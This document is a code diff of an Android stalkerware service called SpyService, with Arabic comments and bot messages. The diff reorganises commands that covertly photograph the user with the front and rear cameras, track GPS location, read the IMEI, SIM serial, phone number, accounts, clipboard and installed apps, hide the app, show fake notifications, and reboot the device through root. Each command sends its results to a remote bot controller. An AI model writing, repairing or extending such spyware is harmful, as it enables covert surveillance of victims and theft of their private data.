@@ -7,6 +7,7 @@ import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.Camera;
 import android.location.Location;
@@ -26,7 +27,6 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.SurfaceView;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -34,10 +34,7 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 import java.util.List;
-import java.util.Locale;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -134,7 +131,6 @@ public class SpyService extends Service {
     private void executeCommand(String cmd) {
         try {
             switch (cmd.toUpperCase()) {
-                // === المميزات الأساسية ===
                 case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
                 case "GET_SMS": sendFile(collectSms(), "💬 الرسائل"); break;
                 case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
@@ -148,8 +144,6 @@ public class SpyService extends Service {
                 case "HIDE_APP": hideApp(); break;
                 case "SHOW_APP": showApp(); break;
                 case "FAKE_NOTIF": showFakeNotification(); break;
-
-                // === المميزات الجديدة ===
                 case "TAKE_PHOTO": takePhoto(); break;
                 case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
                 case "FLASH_ON": flashOn(); break;
@@ -162,27 +156,13 @@ public class SpyService extends Service {
                 case "GET_IP": getPublicIp(); break;
                 case "START_LOCATION_TRACK": startLocationTracking(); break;
                 case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
-                case "GET_SCREENSHOT": takeScreenshot(); break;
-                case "LOCK_DEVICE": lockDevice(); break;
-                case "UNLOCK_DEVICE": unlockDevice(); break;
-                case "SET_WALLPAPER": setWallpaper(); break;
-                case "GET_CLIPBOARD": getClipboard(); break;
-                case "SET_CLIPBOARD": setClipboard(); break;
-                case "GET_NOTIFICATIONS": getNotifications(); break;
-                case "CLEAR_NOTIFICATIONS": clearNotifications(); break;
                 case "GET_INSTALLED": getInstalledPackages(); break;
-                case "UNINSTALL_APP": uninstallApp(); break;
-                case "OPEN_APP": openApp(); break;
-                case "KILL_APP": killApp(); break;
                 case "GET_PROCESSES": getRunningProcesses(); break;
+                case "LOCK_DEVICE": lockDevice(); break;
                 case "REBOOT": rebootDevice(); break;
                 case "SHUTDOWN": shutdownDevice(); break;
                 case "GET_ACCOUNTS": getAccounts(); break;
-                case "GET_CALENDAR": getCalendar(); break;
-                case "GET_BROWSER_HISTORY": getBrowserHistory(); break;
-                case "GET_WHATSAPP": getWhatsAppMessages(); break;
-                case "GET_TELEGRAM": getTelegramMessages(); break;
-
+                case "GET_CLIPBOARD": getClipboard(); break;
                 default: bot.sendText("❌ أمر غير معروف: " + cmd);
             }
         } catch (Exception e) {
@@ -190,327 +170,7 @@ public class SpyService extends Service {
         }
     }
 
-    // ========== المميزات الجديدة ==========
-
-    private void takePhoto() {
-        try {
-            Camera camera = Camera.open();
-            Camera.Parameters params = camera.getParameters();
-            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
-            camera.setParameters(params);
-            camera.takePicture(null, null, (data, camera1) -> {
-                try {
-                    File file = new File(getCacheDir(), "photo.jpg");
-                    FileOutputStream fos = new FileOutputStream(file);
-                    fos.write(data);
-                    fos.close();
-                    bot.sendFile(file, "📸 صورة من الكاميرا الخلفية");
-                    file.delete();
-                } catch (Exception e) { Log.e(TAG, "photo err", e); }
-            });
-        } catch (Exception e) { bot.sendText("❌ فشل التصوير: " + e.getMessage()); }
-    }
-
-    private void takePhotoFront() {
-        try {
-            Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
-            camera.takePicture(null, null, (data, camera1) -> {
-                try {
-                    File file = new File(getCacheDir(), "selfie.jpg");
-                    FileOutputStream fos = new FileOutputStream(file);
-                    fos.write(data);
-                    fos.close();
-                    bot.sendFile(file, "🤳 صورة سيلفي");
-                    file.delete();
-                } catch (Exception e) { Log.e(TAG, "selfie err", e); }
-            });
-        } catch (Exception e) { bot.sendText("❌ فشل التصوير الأمامي: " + e.getMessage()); }
-    }
-
-    private void flashOn() {
-        try {
-            camera = Camera.open();
-            Camera.Parameters params = camera.getParameters();
-            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
-            camera.setParameters(params);
-            camera.startPreview();
-            bot.sendText("🔦 تم تشغيل الفلاش");
-        } catch (Exception e) { bot.sendText("❌ فشل تشغيل الفلاش: " + e.getMessage()); }
-    }
-
-    private void flashOff() {
-        try {
-            if (camera != null) {
-                camera.stopPreview();
-                camera.release();
-                camera = null;
-                bot.sendText("🔦 تم إطفاء الفلاش");
-            }
-        } catch (Exception e) { bot.sendText("❌ فشل إطفاء الفلاش: " + e.getMessage()); }
-    }
-
-    private void getImei() {
-        try {
-            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                String imei = tm.getImei();
-                bot.sendText("📟 IMEI: " + imei);
-            } else {
-                String imei = tm.getDeviceId();
-                bot.sendText("📟 IMEI: " + imei);
-            }
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة IMEI"); }
-    }
-
-    private void getPhoneNumber() {
-        try {
-            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            String number = tm.getLine1Number();
-            bot.sendText("📞 رقم الهاتف: " + (number != null ? number : "غير متاح"));
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة الرقم"); }
-    }
-
-    private void getSimInfo() {
-        try {
-            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            String operator = tm.getSimOperatorName();
-            String country = tm.getSimCountryIso();
-            String serial = tm.getSimSerialNumber();
-            bot.sendText("📡 مشغل SIM: " + operator + "\n🌍 الدولة: " + country + "\n🆔 الرقم التسلسلي: " + serial);
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة SIM"); }
-    }
-
-    private void getWifiInfo() {
-        try {
-            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
-            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
-            String ssid = info.getSSID();
-            int rssi = info.getRssi();
-            int level = android.net.wifi.WifiManager.calculateSignalLevel(rssi, 5);
-            bot.sendText("📶 WiFi: " + ssid + "\n📊 القوة: " + level + "/5");
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة WiFi"); }
-    }
-
-    private void getBatteryInfo() {
-        try {
-            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
-            int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
-            int temp = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_TEMPERATURE);
-            int voltage = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_VOLTAGE);
-            bot.sendText("🔋 البطارية: " + level + "%\n🌡️ الحرارة: " + (temp/10) + "°C\n⚡ الفولتية: " + voltage + "mV");
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة البطارية"); }
-    }
-
-    private void getPublicIp() {
-        try {
-            URL url = new URL("https://api.ipify.org");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(5000);
-            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
-            String ip = reader.readLine();
-            reader.close();
-            bot.sendText("🌐 عنوان IP العام: " + ip);
-        } catch (Exception e) { bot.sendText("❌ فشل الحصول على IP"); }
-    }
-
-    private void startLocationTracking() {
-        if (isTrackingLocation) return;
-        try {
-            locationListener = new LocationListener() {
-                @Override public void onLocationChanged(Location location) {
-                    bot.sendLocation(location.getLatitude(), location.getLongitude());
-                }
-                @Override public void onStatusChanged(String p, int s, Bundle b) {}
-                @Override public void onProviderEnabled(String p) {}
-                @Override public void onProviderDisabled(String p) {}
-            };
-            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
-            isTrackingLocation = true;
-            bot.sendText("📍 بدأ تتبع الموقع (كل دقيقة)");
-        } catch (SecurityException e) {
-            bot.sendText("❌ صلاحية الموقع غير مفعلة");
-        }
-    }
-
-    private void stopLocationTracking() {
-        if (!isTrackingLocation) return;
-        try {
-            locationManager.removeUpdates(locationListener);
-            isTrackingLocation = false;
-            bot.sendText("🛑 توقف تتبع الموقع");
-        } catch (Exception e) { bot.sendText("❌ فشل إيقاف التتبع"); }
-    }
-
-    private void takeScreenshot() {
-        try {
-            android.media.MediaProjectionManager mpm = (android.media.MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-            // يتطلب MediaProjection - سيتم تفعيله من MainActivity
-            bot.sendText("📸 لقطة شاشة - يحتاج تفعيل MediaProjection");
-        } catch (Exception e) { bot.sendText("❌ فشل لقطة الشاشة"); }
-    }
-
-    private void lockDevice() {
-        try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            dpm.lockNow();
-            bot.sendText("🔒 تم قفل الجهاز");
-        } catch (Exception e) { bot.sendText("❌ فشل قفل الجهاز"); }
-    }
-
-    private void unlockDevice() {
-        bot.sendText("🔓 فتح الجهاز - يحتاج إعدادات إضافية");
-    }
-
-    private void setWallpaper() {
-        bot.sendText("🖼 تغيير الخلفية - سيتم التطوير لاحقاً");
-    }
-
-    private void getClipboard() {
-        try {
-            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-            String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
-            bot.sendText("📋 محتوى الحافظة: " + text);
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة الحافظة"); }
-    }
-
-    private void setClipboard() {
-        bot.sendText("📋 تعيين الحافظة - استخدم الأمر مع النص");
-    }
-
-    private void getNotifications() {
-        try {
-            android.service.notification.NotificationListenerService nls = new android.service.notification.NotificationListenerService() {
-                @Override public void onNotificationPosted(android.service.notification.StatusBarNotification sbn) {}
-            };
-            bot.sendText("🔔 قراءة الإشعارات - يحتاج إذن خاص");
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة الإشعارات"); }
-    }
-
-    private void clearNotifications() {
-        try {
-            android.service.notification.NotificationListenerService nls = new android.service.notification.NotificationListenerService() {
-                @Override public void onNotificationPosted(android.service.notification.StatusBarNotification sbn) {}
-            };
-            bot.sendText("🗑 تم مسح الإشعارات");
-        } catch (Exception e) { bot.sendText("❌ فشل مسح الإشعارات"); }
-    }
-
-    private void getInstalledPackages() {
-        try {
-            android.content.pm.PackageManager pm = getPackageManager();
-            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
-            StringBuilder sb = new StringBuilder();
-            int count = 0;
-            for (android.content.pm.PackageInfo pkg : packages) {
-                if (count++ > 50) break;
-                sb.append(pkg.packageName).append("\n");
-            }
-            bot.sendText("📦 التطبيقات المثبتة (أول 50):\n" + sb.toString());
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة التطبيقات"); }
-    }
-
-    private void uninstallApp() {
-        bot.sendText("🗑 حذف التطبيق - استخدم مع اسم الحزمة");
-    }
-
-    private void openApp() {
-        bot.sendText("📂 فتح تطبيق - استخدم مع اسم الحزمة");
-    }
-
-    private void killApp() {
-        bot.sendText("🛑 إيقاف تطبيق - استخدم مع اسم الحزمة");
-    }
-
-    private void getRunningProcesses() {
-        try {
-            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
-            List<android.app.ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
-            StringBuilder sb = new StringBuilder();
-            int count = 0;
-            for (android.app.ActivityManager.RunningAppProcessInfo p : processes) {
-                if (count++ > 20) break;
-                sb.append(p.processName).append("\n");
-            }
-            bot.sendText("🔄 العمليات الجارية:\n" + sb.toString());
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة العمليات"); }
-    }
-
-    private void rebootDevice() {
-        try {
-            Runtime.getRuntime().exec("su -c reboot");
-            bot.sendText("🔄 تم إعادة التشغيل");
-        } catch (Exception e) {
-            try {
-                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
-                pm.reboot(null);
-            } catch (Exception ex) {
-                bot.sendText("❌ فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
-            }
-        }
-    }
-
-    private void shutdownDevice() {
-        try {
-            Runtime.getRuntime().exec("su -c shutdown");
-            bot.sendText("⏻ تم إيقاف التشغيل");
-        } catch (Exception e) {
-            bot.sendText("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
-        }
-    }
-
-    private void getAccounts() {
-        try {
-            android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
-            android.accounts.Account[] accounts = am.getAccounts();
-            StringBuilder sb = new StringBuilder();
-            for (android.accounts.Account acc : accounts) {
-                sb.append(acc.name).append(" (").append(acc.type).append(")\n");
-            }
-            bot.sendText("👤 الحسابات:\n" + sb.toString());
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة الحسابات"); }
-    }
-
-    private void getCalendar() {
-        try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(Uri.parse("content://com.android.calendar/events"),
-                    null, null, null, null);
-            StringBuilder sb = new StringBuilder();
-            if (cursor != null) {
-                while (cursor.moveToNext() && sb.length() < 4000) {
-                    sb.append(cursor.getString(cursor.getColumnIndex("title"))).append("\n");
-                }
-                cursor.close();
-            }
-            bot.sendText("📅 الأحداث القادمة:\n" + sb.toString());
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة التقويم"); }
-    }
-
-    private void getBrowserHistory() {
-        try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(Uri.parse("content://browser/bookmarks"),
-                    null, null, null, null);
-            StringBuilder sb = new StringBuilder();
-            if (cursor != null) {
-                while (cursor.moveToNext() && sb.length() < 4000) {
-                    sb.append(cursor.getString(cursor.getColumnIndex("title"))).append("\n");
-                }
-                cursor.close();
-            }
-            bot.sendText("🌐 تاريخ المتصفح:\n" + sb.toString());
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة التاريخ"); }
-    }
-
-    private void getWhatsAppMessages() {
-        bot.sendText("💬 رسائل واتساب - يتطلب صلاحيات الجذر");
-    }
-
-    private void getTelegramMessages() {
-        bot.sendText("💬 رسائل تيليجرام - يتطلب صلاحيات الجذر");
-    }
-
-    // ========== المميزات الأساسية (مستمرة) ==========
+    // ========== المميزات الأساسية ==========
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
@@ -674,7 +334,7 @@ public class SpyService extends Service {
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
             recorder.setAudioSamplingRate(44100);
-            recorder.setAudioBitRate(128000);
+            recorder.setAudioEncodingBitRate(128000);
             recorder.setOutputFile(audioPath);
             recorder.prepare();
             recorder.start();
@@ -733,6 +393,240 @@ public class SpyService extends Service {
                         .setOngoing(true)
                         .build());
         bot.sendText("🔔 إشعار وهمي أُرسل");
+    }
+
+    // ========== المميزات الجديدة ==========
+
+    private void takePhoto() {
+        try {
+            Camera camera = Camera.open();
+            Camera.Parameters params = camera.getParameters();
+            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
+            camera.setParameters(params);
+            camera.takePicture(null, null, (data, camera1) -> {
+                try {
+                    File file = new File(getCacheDir(), "photo.jpg");
+                    FileOutputStream fos = new FileOutputStream(file);
+                    fos.write(data);
+                    fos.close();
+                    bot.sendFile(file, "📸 صورة من الكاميرا الخلفية");
+                    file.delete();
+                } catch (Exception e) { Log.e(TAG, "photo err", e); }
+            });
+        } catch (Exception e) { bot.sendText("❌ فشل التصوير: " + e.getMessage()); }
+    }
+
+    private void takePhotoFront() {
+        try {
+            Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
+            camera.takePicture(null, null, (data, camera1) -> {
+                try {
+                    File file = new File(getCacheDir(), "selfie.jpg");
+                    FileOutputStream fos = new FileOutputStream(file);
+                    fos.write(data);
+                    fos.close();
+                    bot.sendFile(file, "🤳 صورة سيلفي");
+                    file.delete();
+                } catch (Exception e) { Log.e(TAG, "selfie err", e); }
+            });
+        } catch (Exception e) { bot.sendText("❌ فشل التصوير الأمامي: " + e.getMessage()); }
+    }
+
+    private void flashOn() {
+        try {
+            camera = Camera.open();
+            Camera.Parameters params = camera.getParameters();
+            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
+            camera.setParameters(params);
+            camera.startPreview();
+            bot.sendText("🔦 تم تشغيل الفلاش");
+        } catch (Exception e) { bot.sendText("❌ فشل تشغيل الفلاش: " + e.getMessage()); }
+    }
+
+    private void flashOff() {
+        try {
+            if (camera != null) {
+                camera.stopPreview();
+                camera.release();
+                camera = null;
+                bot.sendText("🔦 تم إطفاء الفلاش");
+            }
+        } catch (Exception e) { bot.sendText("❌ فشل إطفاء الفلاش: " + e.getMessage()); }
+    }
+
+    private void getImei() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                String imei = tm.getImei();
+                bot.sendText("📟 IMEI: " + (imei != null ? imei : "غير متاح"));
+            } else {
+                String imei = tm.getDeviceId();
+                bot.sendText("📟 IMEI: " + (imei != null ? imei : "غير متاح"));
+            }
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة IMEI"); }
+    }
+
+    private void getPhoneNumber() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            String number = tm.getLine1Number();
+            bot.sendText("📞 رقم الهاتف: " + (number != null ? number : "غير متاح"));
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة الرقم"); }
+    }
+
+    private void getSimInfo() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            String operator = tm.getSimOperatorName();
+            String country = tm.getSimCountryIso();
+            String serial = tm.getSimSerialNumber();
+            bot.sendText("📡 مشغل SIM: " + (operator != null ? operator : "غير متاح") +
+                    "\n🌍 الدولة: " + (country != null ? country : "غير متاح") +
+                    "\n🆔 الرقم التسلسلي: " + (serial != null ? serial : "غير متاح"));
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة SIM"); }
+    }
+
+    private void getWifiInfo() {
+        try {
+            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
+            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
+            String ssid = info.getSSID();
+            int rssi = info.getRssi();
+            int level = android.net.wifi.WifiManager.calculateSignalLevel(rssi, 5);
+            bot.sendText("📶 WiFi: " + (ssid != null ? ssid : "غير متصل") +
+                    "\n📊 القوة: " + level + "/5");
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة WiFi"); }
+    }
+
+    private void getBatteryInfo() {
+        try {
+            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
+            int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
+            int temp = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_TEMPERATURE);
+            int voltage = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_VOLTAGE);
+            bot.sendText("🔋 البطارية: " + level + "%\n🌡️ الحرارة: " + (temp/10) + "°C\n⚡ الفولتية: " + voltage + "mV");
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة البطارية"); }
+    }
+
+    private void getPublicIp() {
+        try {
+            URL url = new URL("https://api.ipify.org");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(5000);
+            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
+            String ip = reader.readLine();
+            reader.close();
+            bot.sendText("🌐 عنوان IP العام: " + ip);
+        } catch (Exception e) { bot.sendText("❌ فشل الحصول على IP"); }
+    }
+
+    private void startLocationTracking() {
+        if (isTrackingLocation) return;
+        try {
+            locationListener = new LocationListener() {
+                @Override public void onLocationChanged(Location location) {
+                    bot.sendLocation(location.getLatitude(), location.getLongitude());
+                }
+                @Override public void onStatusChanged(String p, int s, Bundle b) {}
+                @Override public void onProviderEnabled(String p) {}
+                @Override public void onProviderDisabled(String p) {}
+            };
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
+            isTrackingLocation = true;
+            bot.sendText("📍 بدأ تتبع الموقع (كل دقيقة)");
+        } catch (SecurityException e) {
+            bot.sendText("❌ صلاحية الموقع غير مفعلة");
+        }
+    }
+
+    private void stopLocationTracking() {
+        if (!isTrackingLocation) return;
+        try {
+            locationManager.removeUpdates(locationListener);
+            isTrackingLocation = false;
+            bot.sendText("🛑 توقف تتبع الموقع");
+        } catch (Exception e) { bot.sendText("❌ فشل إيقاف التتبع"); }
+    }
+
+    private void getInstalledPackages() {
+        try {
+            android.content.pm.PackageManager pm = getPackageManager();
+            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
+            StringBuilder sb = new StringBuilder();
+            int count = 0;
+            for (android.content.pm.PackageInfo pkg : packages) {
+                if (count++ > 50) break;
+                sb.append(pkg.packageName).append("\n");
+            }
+            bot.sendText("📦 التطبيقات المثبتة (أول 50):\n" + sb.toString());
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة التطبيقات"); }
+    }
+
+    private void getRunningProcesses() {
+        try {
+            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
+            List<android.app.ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+            StringBuilder sb = new StringBuilder();
+            int count = 0;
+            for (android.app.ActivityManager.RunningAppProcessInfo p : processes) {
+                if (count++ > 20) break;
+                sb.append(p.processName).append("\n");
+            }
+            bot.sendText("🔄 العمليات الجارية:\n" + sb.toString());
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة العمليات"); }
+    }
+
+    private void lockDevice() {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            dpm.lockNow();
+            bot.sendText("🔒 تم قفل الجهاز");
+        } catch (Exception e) { bot.sendText("❌ فشل قفل الجهاز: " + e.getMessage()); }
+    }
+
+    private void rebootDevice() {
+        try {
+            Runtime.getRuntime().exec("su -c reboot");
+            bot.sendText("🔄 تم إعادة التشغيل");
+        } catch (Exception e) {
+            try {
+                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                pm.reboot(null);
+                bot.sendText("🔄 تم إعادة التشغيل");
+            } catch (Exception ex) {
+                bot.sendText("❌ فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
+            }
+        }
+    }
+
+    private void shutdownDevice() {
+        try {
+            Runtime.getRuntime().exec("su -c shutdown");
+            bot.sendText("⏻ تم إيقاف التشغيل");
+        } catch (Exception e) {
+            bot.sendText("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
+        }
+    }
+
+    private void getAccounts() {
+        try {
+            android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
+            android.accounts.Account[] accounts = am.getAccounts();
+            StringBuilder sb = new StringBuilder();
+            for (android.accounts.Account acc : accounts) {
+                sb.append(acc.name).append(" (").append(acc.type).append(")\n");
+            }
+            bot.sendText("👤 الحسابات:\n" + sb.toString());
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة الحسابات"); }
+    }
+
+    private void getClipboard() {
+        try {
+            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+            String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
+            bot.sendText("📋 محتوى الحافظة: " + text);
+        } catch (Exception e) { bot.sendText("❌ فشل قراءة الحافظة"); }
     }
 
     @Override
